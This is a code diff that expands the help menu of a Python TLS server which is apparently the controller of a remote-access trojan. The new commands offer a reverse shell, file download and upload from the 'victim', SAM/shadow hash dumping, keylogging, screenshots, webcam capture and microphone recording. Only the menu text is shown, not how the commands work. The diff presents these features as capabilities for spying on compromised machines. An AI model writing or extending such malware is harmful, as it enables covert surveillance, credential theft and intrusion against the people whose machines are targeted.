@@ -188,11 +188,21 @@ class TLSServer:
 
     def _help(self):
         logger.debug("Commands:")
-        logger.debug("  help                     -> send help message to client")
-        logger.debug("  sessions                 -> list sessions")
-        logger.debug("  use <id>                 -> switch session")
-        logger.debug("  shell <listener_port>    -> stop server")
-        logger.debug("  exit                     -> stop server")
+        logger.debug("  help                          -> show this help")
+        logger.debug("  sessions                      -> list sessions")
+        logger.debug("  use <id>                      -> switch session")
+        logger.debug("  shell <listener_port>         -> reverse shell")
+        logger.debug("  download <filepath>           -> download from victim")
+        logger.debug("  upload <filepath>             -> upload to victim")
+        logger.debug("  ipconfig                      -> network config")
+        logger.debug("  screenshot                    -> take screenshot")
+        logger.debug("  search <filename>             -> search file")
+        logger.debug("  hashdump                      -> dump SAM/shadow")
+        logger.debug("  keylogger <seconds>           -> record keystrokes")
+        logger.debug("  webcam_snapshot               -> take webcam photo")
+        logger.debug("  webcam_stream <seconds>       -> live webcam stream")
+        logger.debug("  record_audio <seconds>        -> record microphone")
+        logger.debug("  exit                          -> stop server")
 
     def _use(self, cmd: str):
         try:
